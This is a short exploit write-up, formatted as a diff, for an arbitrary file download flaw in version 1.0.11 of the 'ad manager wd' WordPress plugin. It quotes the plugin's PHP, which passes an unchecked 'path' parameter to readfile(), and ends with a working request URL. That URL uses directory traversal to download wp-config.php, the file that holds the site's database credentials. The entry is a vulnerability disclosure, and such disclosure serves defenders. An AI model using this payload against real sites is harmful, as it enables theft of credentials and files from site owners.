@@ -1,0 +1,35 @@
+Exploit Title: WordPress Plugin ad manager wd v1.0.11 - Arbitrary File
+Download
+Google Dork: N/A
+Date: 25.01.2019
+Vendor Homepage:
+https://web-dorado.com/products/wordpress-ad-manager-wd.html
+Software: https://wordpress.org/plugins/ad-manager-wd
+Version: 1.0.11
+Tested on: Win7 x64,
+
+Exploit Author: 41!kh4224rDz
+Author Mail : scanweb18@gmail.com
+
+Vulnerability:
+wp-content\plugins\ad-manager-wd\wd_ads_admin_class.php
+
+   30/  if (isset($_GET['export']) && $_GET['export'] == 'export_csv')
+
+   97/   $path = $_GET['path'];
+           header('Content-Description: File Transfer');
+           header('Content-Type: application/octet-stream');
+           header('Content-Transfer-Encoding: binary');
+           header('Expires: 0');
+           header('Cache-Control: must-revalidate, post-check=0,
+pre-check=0');
+            header('Pragma: public');
+
+           header('Content-Type: text/csv; charset=utf-8');
+           header('Content-Disposition: attachment; filename=' .
+basename($path));
+
+           readfile($path);
+ Arbitrary File Download/Exploit :
+
+http://localhost/wordpress/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../wp-config.php
